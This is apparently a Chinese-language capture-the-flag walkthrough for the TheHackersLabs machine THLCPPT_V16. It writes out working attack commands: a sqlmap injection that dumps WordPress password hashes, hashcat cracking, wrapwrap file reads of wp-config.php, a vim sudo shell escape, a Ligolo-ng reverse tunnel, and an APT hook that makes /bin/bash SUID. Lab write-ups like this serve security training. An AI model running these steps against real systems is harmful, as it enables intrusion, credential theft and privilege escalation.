# thl_THLCPPT_V16笔记

**靶机**：https://thehackerslabs.com/thlcpptv16/

**难度**：专家（EXPERTO）

**目标 IP**：192.168.205.152
**本机 IP**：192.168.205.141

# 1.端口枚举及服务探测

使用 `nmap` 扫描目标 IP 的开放端口：

```
nmap 192.168.205.152
```

![image](https://github.com/user-attachments/assets/c9e617e5-96af-47a7-832e-7ea63715d9d6)

访问 80 端口

![image](https://github.com/user-attachments/assets/b8625cb6-3e5c-483b-aa82-6ccbfc550f2a)

点击 Ir al Examen 发现子域，分别为：

1. examen.thlcpptv16.thl
2. thlcpptv16.thl

将这两个域名添加到 `/etc/hosts` 文件中，进一步探查。

![image](https://github.com/user-attachments/assets/dc44dd45-d812-4514-ac6b-8d114af6acba)

打开 `examen.thlcpptv16.thl`，发现目标运行了 **WordPress**。

# 2.Wordpress 枚举

使用 **wpscan** 进行 WordPress 用户枚举：

```
wpscan --url examen.thlcpptv16.thl -e vp,u --api-token xxx   #api-token注册wpscan官网获取
```

扫描结果显示以下用户：

1. **examinador**
2. **tom**
3. **jerry**

![image](https://github.com/user-attachments/assets/9bcae154-f035-4d1d-b807-d6722bc3749a)

用户较多，因此我们尝试 SQL 注入漏洞。关于该漏洞的更多信息可以参考

> [!IMPORTANT]
>
> 1. https://wpscan.com/vulnerability/2b5860f1-f029-496a-a479-082b78c5bda4
> 2. https://www.tenable.com/security/research/tra-2023-40

![image](https://github.com/user-attachments/assets/d54e46b9-e1d9-4ae4-959d-533c500828fc)

![image](https://github.com/user-attachments/assets/48e4be02-5f6e-4566-bd5c-134fbc36e90d)

# 3.SQL 注入漏洞利用

尝试构造 SQL 注入 payload，利用漏洞获取 WordPress 数据库中的用户信息：

```
http://examen.thlcpptv16.thl/?rest_route=/my-calendar/v1/events&to=1*
```

然后使用 **sqlmap** 进行自动化注入，提取用户信息：

```
sqlmap -u 'examen.thlcpptv16.thl/?rest_route=/my-calendar/v1/events&to=1*' --batch -D wordpress -T wp_users -C user_login,user_pass --dump
```

输出如下，成功获取到用户的哈希密码：

```
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| jerry      | $P$B0uohNeAjd6aq3n0dv6NC7Nhkro0Kt. |
| examinador | $P$B43UAoTTnv0stdbxGqzwyQtyXm86x/1 |
| tom        | $P$BJrv/Sv/rBlufcIW5FiMdUW4lA5UrN1 |
+------------+------------------------------------+
```

# 4.Hash 密码爆破

使用 **hashid** 工具识别哈希算法：

```
hashid -e hash
```

![image](https://github.com/user-attachments/assets/3e569c79-85a8-4b52-974f-91f1505f192b)

然后使用 **hashcat** 进行密码爆破：

```
hashcat -a 0 -m 400 hash /usr/share/wordlists/q5000.txt
```

![image](https://github.com/user-attachments/assets/46a062a2-b8ac-46dd-9edc-2a7030aa7854)

爆破成功，获得了 `tom` 用户凭证

# 5.WrapWrap Filter 漏洞

> [!IMPORTANT]
> https://github.com/ambionics/wrapwrap

![image](https://github.com/user-attachments/assets/d2ff7f6f-34e7-4931-885f-74ce45c5b96e)

![image](https://github.com/user-attachments/assets/d618e2ae-0b45-4a3c-856d-5d24b5838035)

通过利用WrapWrap漏洞，构造攻击：

```
git clone https://github.com/ambionics/wrapwrap.git
git clone https://github.com/cfreal/ten.git
cd ten
python3 -m venv ./venv
source ./venv/bin/activate
pip install .
python3 wrapwrap.py /etc/passwd '{"message":"' '"}' 1300
python3 -m http.server 9000
```

![image](https://github.com/user-attachments/assets/8fa3956f-d1ea-40cf-8659-ecb8a3a52f04)

看看他提示的泄漏信息是什么

```
python3 wrapwrap.py /var/www/examen.thlcpptv16.thl/wp-config.php  '{"message":"' '"}' 1300
```

![image](https://github.com/user-attachments/assets/08eb3101-eae7-4d76-b161-a2923014f797)

成功通过 `wrapwrap.py` 获取 tom 密码。

# 6.SSH 登录与提权

查看 tom 家目录下的敏感信息

![image](https://github.com/user-attachments/assets/abb3f249-2485-4f6e-ac74-4ad80a8b5dea)

```
cat ./bashrc
```

![image](https://github.com/user-attachments/assets/f94ac21e-1b78-43cf-83e2-d562255805d3)

发现一个 rafael 用户的帐号和密码

![image](https://github.com/user-attachments/assets/65b15b69-d3a3-47d4-888a-918e43705fb3)

在/var/backup/目录上发现了一个名为 **passwd.dll** 的文件，属于用户 `jerry`。虽然内容是可读的，但似乎使用了某种编码。
最后通过使用rot13解码获得其内容进行解码，成功获取了 `jerry` 用户的 SSH 密钥

> [!IMPORTANT]
> https://rot13.com/

有了这些凭证，我们要做的第一件事就是进入 Rafael 的机器。

![image](https://github.com/user-attachments/assets/587d5b54-120a-41f7-9358-20f254f98481)

查看 sudo 权限看看有没有惊喜

![image](https://github.com/user-attachments/assets/6f8a870e-d91e-45b6-a838-32bbd15fcdcc)

vim 提权有很多方式，可以通过 gtfobins查看，我的方式是进入 vim 然后进入命令模式,`!/bin/bash` 提权

> [!IMPORTANT]
> https://gtfobins.github.io/

具体就是先输入 `:` 再输入 `!/bin/bash`

# 7.VPN 隧道与进一步渗透

查看 `根` 目录，发现一个名为 `tunnelRafael.conf` 的文件，它与 VPN（虚拟专用网络）工具 WireGuard 的典型配置相匹配。

![image](https://github.com/user-attachments/assets/e53b5f4b-799e-44cb-86b5-bebcbe269a2a)

先使用Ligolo-NG把隧道建立一下

> [!IMPORTANT]
> https://github.com/nicocha30/ligolo-ng

```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.101.0.0/28 dev ligolo
./ligolo-agent -connect 192.168.205.141:11601 -ignore-cert
ligolo-proxy -selfcert
```

现在我们已经使用代理手段在目标网络内了，然后通过 WireGuard 连接 VPN（这里记得把 `tunnelRafael.conf` 托到攻击机）

```
sudo apt install wireguard-tools resolvconf
wg-quick up tunnelRafael.conf
```

![image](https://github.com/user-attachments/assets/bf6081a9-6418-4531-ba38-ecf7af7afbfb)

建立成功，网段为 10.13.13.0/24

扫描到通过 VPN 建立的子网 **10.13.13.0/24**

```
fping -asgq 10.13.13.0/24
```

![image](https://github.com/user-attachments/assets/53939c0f-4585-4095-9e62-4b4d3b66c8b8)

根据推测可以看出应该是 10.13.13.3，扫描一下 22 端口是不是开放的，因为我们还有一个 `jerry` 用户信息没用过

```
nmap -p22 -Pn 10.13.13.3
```

![image](https://github.com/user-attachments/assets/22fc3b72-3125-4a48-954d-3828b7e2d389)

确实是开放的，连接上去

![image](https://github.com/user-attachments/assets/5775c59b-9752-47a6-aae0-e17ac45e9efa)

甩了一个 Linpeas 脚本,我们得知用户 `jerry` 属于 `sistema` 组，他能够写入 `/etc/apt/apt.conf.d`，那我们可以在更新软件包使用 APT 命令修改 bash 权限。

```
echo 'APT::Update::Pre-Invoke:: {"chmod u+s /bin/bash"};' > /etc/apt/apt.conf.d/01ab
```

![image](https://github.com/user-attachments/assets/5dd2d63a-355a-4480-a0ba-da2cbdf81215)

找到了 **jerry** 凭证，使用这个凭证再重新连接主 ip

![image](https://github.com/user-attachments/assets/5b778922-ef9e-4af3-b23d-d2a28a2f7b02)

查看 sudo 权限可以看到我们可以**以 root 身份运行 nginx，**  通过 google 搜索可以发现一个关于nginx 的漏洞

> [!IMPORTANT]
> https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406

```
./exploit.sh
ssh -i /home/jerry/.ssh/id\_rsa root@127.0.0.1
```

拿下 root